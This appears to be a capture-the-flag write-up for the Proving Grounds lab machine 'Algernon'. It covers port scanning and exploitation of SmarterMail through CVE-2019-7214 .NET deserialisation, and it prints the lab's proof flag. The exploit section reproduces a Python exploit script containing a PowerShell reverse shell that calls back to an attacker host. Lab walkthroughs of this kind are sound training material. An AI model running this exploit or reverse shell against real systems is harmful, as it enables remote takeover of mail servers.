---
title: Proving Grounds Practice — Algernon              
date: 2025-06-24 00:00:00 +0800      
categories: [proving gounds]          
tags: [proving gounds]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                       
---
- **OS**: Windows
- **Difficulty**: Easy

## Service Enumeration

**Port Scan Results**

**TCP**: 21, 80, 135, 139, 445, 9998

We run nmapAutomator to scan the target and found a few ports open.

> [nmapAutomator - GitHub](https://github.com/21y4d/nmapAutomator)

```
└─$ ./nmapAutomator.sh 192.168.160.65 All

Running all scans on 192.168.160.65

Host is likely running Unknown OS!


---------------------Starting Port Scan-----------------------



PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
9998/tcp open  distinct32



---------------------Starting Script Scan-----------------------



PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 01-06-25  04:54AM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
9998/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
|_http-server-header: Microsoft-IIS/10.0
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Tue, 24 Jun 2025 23:09:22 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-24T23:09:24
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required



OS Detection modified to: Windows



---------------------Starting Full Scan------------------------


PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
7680/tcp  open  pando-pub
9998/tcp  open  distinct32
17001/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49710/tcp open  unknown



Making a script scan on extra ports: 7680, 17001, 49664, 49665, 49666, 49667, 49668, 49669, 49710


PORT      STATE SERVICE  VERSION
17001/tcp open  remoting MS .NET Remoting services
49664/tcp open  msrpc    Microsoft Windows RPC
49665/tcp open  msrpc    Microsoft Windows RPC
49666/tcp open  msrpc    Microsoft Windows RPC
49667/tcp open  msrpc    Microsoft Windows RPC
49668/tcp open  msrpc    Microsoft Windows RPC
49669/tcp open  msrpc    Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Initial Access and Privilege Escalation — smartermail `.NET deserialisation to RCE`

We saw port 9998 web page is smartermail login interface.

![image-20260211032200708](assets/img/image-20260211032200708.png)

We found an exploits in exploitdb.

SmarterMail before build 6985 provides a .NET remoting endpoint which is vulnerable to a .NET deserialisation attack.

> [OffSec's Exploit Database Archive - SmarterMail Build 6985 - Remote Code Execution (CVE-2019-7214)](https://www.exploit-db.com/exploits/49216)

> [NVD - CVE-2019-7214](https://nvd.nist.gov/vuln/detail/CVE-2019-7214)

Download the exploits

```yaml
searchsploit -m 49216
vim 49216.py
```

![image-20260211032216705](assets/img/image-20260211032216705.png)

Change target host and port number at exploits.

![image-20260211032222763](assets/img/image-20260211032222763.png)

Changed exploit code

```python
# Exploit Title: SmarterMail Build 6985 - Remote Code Execution
# Exploit Author: 1F98D
# Original Author: Soroush Dalili
# Date: 10 May 2020
# Vendor Hompage: re
# CVE: CVE-2019-7214
# Tested on: Windows 10 x64
# References:
# https://www.nccgroup.trust/uk/our-research/technical-advisory-multiple-vulnerabilities-in-smartermail/
#
# SmarterMail before build 6985 provides a .NET remoting endpoint
# which is vulnerable to a .NET deserialisation attack.
#
#!/usr/bin/python3

import base64
import socket
import sys
from struct import pack

HOST='192.168.160.65'
PORT=17001
LHOST='192.168.45.250'
LPORT=80

psh_shell = '$client = New-Object System.Net.Sockets.TCPClient("'+LHOST+'",'+str(LPORT)+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
psh_shell = psh_shell.encode('utf-16')[2:] # remove BOM
psh_shell = base64.b64encode(psh_shell)
psh_shell = psh_shell.ljust(1360, b' ')

payload = 'AAEAAAD/////AQAAAAAAAAAC...<truncated>...Cw=='
payload = base64.b64decode(payload)
payload = payload.replace(bytes("X"*1360, 'utf-8'), psh_shell)

uri = bytes('tcp://{}:{}/Servers'.format(HOST, str(PORT)), 'utf-8')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

msg = bytes()
msg += b'.NET'                 # Header
msg += b'\x01'                 # Version Major
msg += b'\x00'                 # Version Minor
msg += b'\x00\x00'             # Operation Type
msg += b'\x00\x00'             # Content Distribution
msg += pack('I', len(payload)) # Data Length
msg += b'\x04\x00'             # URI Header
msg += b'\x01'                 # Data Type
msg += b'\x01'                 # Encoding - UTF8
msg += pack('I', len(uri))     # URI Length
msg += uri                     # URI
msg += b'\x00\x00'             # Terminating Header
msg += payload                 # Data

s.send(msg)
s.close()
```

get shell.

```bash
python3 49216.py
```

![image-20260211032227776](assets/img/image-20260211032227776.png)

## Post Exploitation

**proof.txt value:** 6482d446e364c70931ac649744390a06

```bash
whoami
type c:\users\administrator\desktop\proof.txt
```

![image-20260211032236878](assets/img/image-20260211032236878.png)
